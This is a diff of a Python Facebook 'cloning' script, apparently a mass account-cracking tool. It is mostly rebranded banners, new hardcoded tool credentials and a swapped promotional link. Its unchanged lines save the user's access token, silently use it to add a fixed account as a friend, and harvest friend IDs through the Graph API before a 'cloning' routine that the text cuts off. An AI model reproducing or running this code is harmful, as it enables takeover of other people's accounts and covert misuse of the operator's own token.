@@ -71,16 +71,16 @@ logo = """
 
  ♨️°───────(NOUMAN_AZIZ)───────°♨️ 
 \033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
-\033[1;96m║✯ Creator ✯ Nouman aziz        ║ 
+\033[1;96m║✯ Creator ✯ Nouman aziz                 ║ 
 
-\033[1;92m║✯ Instagram ✯ noumifbtricker005║    
+\033[1;92m║✯ Instagram ✯ noumifbtricker005         ║    
 
-\033[1;94m║✯ Channel ✯ NI HAI             ║   
+\033[1;94m║✯ Channel ✯ DON,T USE CHANNEL           ║   
 
-\033[1;97m║✯ Channel ✯NI HAI              ║ 
+\033[1;97m║✯ Channel ✯ DON,T USE CHANNEL           ║ 
 
-\033[1;91m║✯ Facebook ✯ Nouman aziz       ║ 
-\033[1;96m║✯ HAPPY INDEPENDENCE DAY       ║
+\033[1;91m║✯ Facebook ✯ Nouman aziz                ║ 
+\033[1;96m║✯        ║
 \033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -99,22 +99,22 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m###########pisktan_zindabad####################
-\033[1;96m~ FEEL THE POWER OF PAKISTAN PAKISTAN ZINDABAD~
-\033[1;97m###########pakistan_zindabad###################
+\033[1;97m###########NOUMAN-AZIZ####################
+\033[1;96m~ Note=don,t edit my script more~
+\033[1;97m###########NOUMAN-AZIZ###################
 
-\033[1;96m██╗░░░░░░█████╗░██╗░░░██╗███████╗ New Update 0.9•✓
-\033[1;96m██║░░░░░██╔══██╗██║░░░██║██╔════╝
-\033[1;96m██║░░░░░██║░░██║╚██╗░██╔╝█████╗░░
-\033[1;96m██║░░░░░██║░░██║░╚████╔╝░██╔══╝░░
-\033[1;96m███████╗╚█████╔╝░░╚██╔╝░░███████╗
-\033[1;96m╚══════╝░╚════╝░░░░╚═╝░░░╚══════╝
+\033[1;96m░█████╗░██╗░░░░░██╗███████╗███╗░░██╗New Update 0.9•✓
+\033[1;96m██╔══██╗██║░░░░░██║██╔════╝████╗░██║
+\033[1;96m███████║██║░░░░░██║█████╗░░██╔██╗██║
+\033[1;96m██╔══██║██║░░░░░██║██╔══╝░░██║╚████║
+\033[1;96m██║░░██║███████╗██║███████╗██║░╚███║
+\033[1;96m╚═╝░░╚═╝╚══════╝╚═╝╚══════╝╚═╝░░╚══╝
  💔LOVE YOU PAKISTAN🇵🇰 AND PAK ARMY💔
- 😘HAPPY INDEPENDENCE DAY😘
+ 😍ALLAH KHUSH RAKA SAB PAKISTANI KO😍
 """
 
-CorrectUsername = "pakistan"
-CorrectPassword = "zindabad"
+CorrectUsername = "alien"
+CorrectPassword = "alien"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -126,10 +126,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+            os.system('xdg-open https://www.facebook.com/profile.php?id=100046773248216')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100046773248216')
 
 def login():
 	os.system('clear')
@@ -170,7 +170,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/c/AsimPardasi')
+				os.system('xdg-open https://www.facebook.com/profile.php?id=100046773248216')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -237,7 +237,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m◄══════════════════PAKISTAN_ZINDABAD══════════════════►\n"
+		print " \033[1;36;40m◄══════════════════Nouman-aziz══════════════════►\n"
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
@@ -274,7 +274,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•═══\033[1;91mAsim-Pardasi\033[1;97m═══•◈•"
+		print "\033[1;97m•◈•═══\033[1;91mNouman aziz\033[1;97m═══•◈•"
 		jalan('\033[1;91mGetting IDs \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -284,7 +284,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•══════•◈\033[1;91mAaim Pardasi\033[1;95m◈•══════•◈•"
+		print "\033[1;95m•◈•══════•◈\033[1;91mNouman aziz\033[1;95m◈•══════•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -310,10 +310,10 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;92m◄══════════════════CH══════════════════►"
+	print "   \033[1;92m◄══════════════════nouman══════════════════►"
 
-	jalan('          \033[1;91mPAKISTAN start cloning Wait...')
-	print  "  \033[1;92m ◄══════════════════PAKISTAN══════════════════►" 
+	jalan('          \033[1;91mNouman start cloning Wait...')
+	print  "  \033[1;92m ◄══════════════════Nouman══════════════════►" 
 
 	def main(arg):
 		global cekpoint,oks
